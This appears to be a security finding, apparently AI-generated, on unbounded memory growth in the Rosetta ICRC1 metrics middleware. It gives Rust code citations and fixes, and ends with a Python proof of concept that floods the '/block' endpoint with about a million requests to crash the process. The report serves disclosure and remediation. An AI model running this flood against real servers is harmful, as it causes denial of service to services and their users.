The code path is fully traceable. Here is the analysis:

---

### Title
Unbounded Global HashMap Growth via Attacker-Controlled `network_identifier.network` in Rosetta Metrics Middleware — (`rs/rosetta-api/common/rosetta_core/src/metrics.rs`)

### Summary

The ICRC1 Rosetta server applies `RosettaMetricsLayer` to every HTTP route. For each request, the middleware extracts `network_identifier.network` from the JSON body as a raw, unvalidated string and calls `RosettaMetrics::new(...)`, which unconditionally inserts into the process-global `CANISTER_DISPLAY_NAMES: Mutex<HashMap<String, String>>`. There is no bound, no eviction, and no validation. An unauthenticated attacker sending N requests with N distinct strings exhausts heap memory.

### Finding Description

**Step 1 — Middleware is applied to all routes.**

In `icrc1/src/main.rs`, the `RosettaMetricsLayer` is applied unconditionally to every route:

```
let metrics_layer = rosetta_metrics.metrics_layer();
let app = Router::new()
    .route("/block", post(block))
    // ... all other routes ...
    .layer(metrics_layer)   // ← applied to every request
``` [1](#0-0) 

**Step 2 — `extract_canister_id` accepts any string, no validation.**

The helper reads `network_identifier.network` as a raw `String` from the JSON body. It does not validate that the value is a valid canister ID, a valid hex string, or anything else:

```rust
let canister_id = match serde_json::from_slice::<Value>(&bytes) {
    Ok(json) => json
        .get("network_identifier")
        .and_then(|ni| ni.get("network"))
        .and_then(|n| n.as_str())
        .map(|s| s.to_string()),   // ← any string accepted
    Err(_) => None,
};
``` [2](#0-1) 

**Step 3 — `RosettaMetrics::new` unconditionally inserts into the global map.**

```rust
pub fn new(token_display_name: String, canister_id: String) -> Self {
    let mut map = CANISTER_DISPLAY_NAMES.lock().unwrap();
    map.insert(canister_id.clone(), token_display_name.clone()); // ← no bound check
    ...
}
``` [3](#0-2) 

**Step 4 — The middleware calls `RosettaMetrics::new` with the attacker string before the endpoint handler validates the network ID.**

```rust
let metrics = match canister_id {
    Some(id) => {
        let display_name = RosettaMetrics::get_display_name_from_canister_id(&id);
        RosettaMetrics::new(display_name, id)  // ← insert happens here
    }
    None => default_metrics,
};
// ... then the request is forwarded to the handler, which may reject it
``` [4](#0-3) 

The endpoint handler (`get_state_from_network_id`) rejects unknown network IDs, but the map insertion has already occurred. [5](#0-4) 

**Step 5 — Secondary amplifier: Prometheus label cardinality explosion.**

`get_display_name_from_canister_id` returns the raw attacker string when no mapping exists, so `token_display_name` is also attacker-controlled. This string is used as a Prometheus label in `inc_api_status_count` and `observe_request_duration`, causing unbounded Prometheus time-series growth in addition to the HashMap growth. [6](#0-5) 

### Impact Explanation

Each unique `network_identifier.network` value adds one entry to `CANISTER_DISPLAY_NAMES` and one or more Prometheus metric time-series. Both are process-global and never evicted. With 1M unique strings of ~50 bytes each, the HashMap alone consumes ~100 MB; Prometheus time-series are heavier. Combined, this causes OOM and process crash. The Rosetta process halts ledger synchronization and all asset bridge operations that depend on it.

### Likelihood Explanation

The attack requires only unauthenticated HTTP POST access to any Rosetta endpoint (e.g., `/block`). No credentials, no special knowledge, no rate-limit bypass is needed. The Rosetta ICRC1 server is designed to be publicly reachable. The attack is trivially scriptable.

### Recommendation

1. **Validate before inserting**: In `extract_canister_id`, attempt to parse the extracted string as a valid `CanisterId` (using `hex::decode` + `PrincipalId::try_from` + `CanisterId::try_from`, as already done in `TryFrom<&NetworkIdentifier> for CanisterId`). Only pass the value to `RosettaMetrics::new` if it parses successfully.
2. **Bound the map**: Cap `CANISTER_DISPLAY_NAMES` at the number of configured tokens (known at startup), or remove the per-request insert entirely and only populate the map at startup from the configured token list.
3. **Do not use attacker-controlled strings as Prometheus label values**: Use only the pre-registered display names from the startup configuration.

### Proof of Concept

```python
import requests, threading

url = "http://<rosetta-host>/block"
def flood(n):
    for i in range(n):
        requests.post(url, json={
            "network_identifier": {"network": f"deadbeef{i:08x}"},
            "block_identifier": {"index": 0}
        })

threads = [threading.Thread(target=flood, args=(100_000,)) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
# After ~1M unique values, RSS grows proportionally; process OOMs
```

### Citations

**File:** rs/rosetta-api/icrc1/src/main.rs (L359-383)
```rust
    let metrics_layer = rosetta_metrics.metrics_layer();

    let app = Router::new()
        .route("/ready", get(ready))
        .route("/health", get(health))
        .route("/call", post(call))
        .route("/network/list", post(network_list))
        .route("/network/options", post(network_options))
        .route("/network/status", post(network_status))
        .route("/block", post(block))
        .route("/account/balance", post(account_balance))
        .route("/block/transaction", post(block_transaction))
        .route("/search/transactions", post(search_transactions))
        .route("/mempool", post(mempool))
        .route("/mempool/transaction", post(mempool_transaction))
        .route("/construction/derive", post(construction_derive))
        .route("/construction/preprocess", post(construction_preprocess))
        .route("/construction/metadata", post(construction_metadata))
        .route("/construction/combine", post(construction_combine))
        .route("/construction/submit", post(construction_submit))
        .route("/construction/hash", post(construction_hash))
        .route("/construction/payloads", post(construction_payloads))
        .route("/construction/parse", post(construction_parse))
        // Apply the metrics middleware
        .layer(metrics_layer)
```

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L117-126)
```rust
    pub fn new(token_display_name: String, canister_id: String) -> Self {
        // Add entry to map associating the canister ID with the display name
        let mut map = CANISTER_DISPLAY_NAMES.lock().unwrap();
        map.insert(canister_id.clone(), token_display_name.clone());

        Self {
            token_display_name,
            canister_id,
        }
    }
```

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L136-172)
```rust
    pub fn inc_api_status_count(&self, status: &str) {
        let labels = &[self.token_display_name.as_str(), status];
        ENDPOINTS_METRICS
            .rosetta_api_status_total
            .with_label_values(labels)
            .inc();
    }

    // This method is deprecated and will be removed in a future version
    // It's kept for backward compatibility with existing code
    pub fn start_request_duration_timer(&self, endpoint: &str) -> HistogramTimer {
        let labels = &[
            self.token_display_name.as_str(),
            endpoint,
            "unknown",
            "unknown",
        ];
        ENDPOINTS_METRICS
            .request_duration
            .with_label_values(labels)
            .start_timer()
    }

    // New method to record request duration directly
    pub fn observe_request_duration(
        &self,
        endpoint: &str,
        method: &str,
        status: &str,
        duration: f64,
    ) {
        let labels = &[self.token_display_name.as_str(), endpoint, method, status];
        ENDPOINTS_METRICS
            .request_duration
            .with_label_values(labels)
            .observe(duration);
    }
```

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L342-348)
```rust
            let metrics = match canister_id {
                Some(id) => {
                    let display_name = RosettaMetrics::get_display_name_from_canister_id(&id);
                    RosettaMetrics::new(display_name, id)
                }
                None => default_metrics,
            };
```

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L397-404)
```rust
    let canister_id = match serde_json::from_slice::<Value>(&bytes) {
        Ok(json) => json
            .get("network_identifier")
            .and_then(|ni| ni.get("network"))
            .and_then(|n| n.as_str())
            .map(|s| s.to_string()),
        Err(_) => None,
    };
```

**File:** rs/rosetta-api/icrc1/src/common/utils/utils.rs (L26-55)
```rust
pub fn get_state_from_network_id(
    network_identifier: &NetworkIdentifier,
    multitoken_state: &MultiTokenAppState,
) -> anyhow::Result<Arc<AppState>> {
    let state = match multitoken_state
        .token_states
        .get(network_identifier.network.as_str())
    {
        Some(state) => state.clone(),
        None => {
            bail!(
                "Network Identifier {} not being tracked",
                network_identifier.blockchain
            );
        }
    };

    let expected = &NetworkIdentifier::new(
        DEFAULT_BLOCKCHAIN.to_owned(),
        state.icrc1_agent.ledger_canister_id.to_string(),
    );

    if network_identifier != expected {
        bail!(
            "Network Identifiers did not match: Expected {:?} | Actual {:?}",
            expected,
            network_identifier
        )
    }
    Ok(state.clone())
```
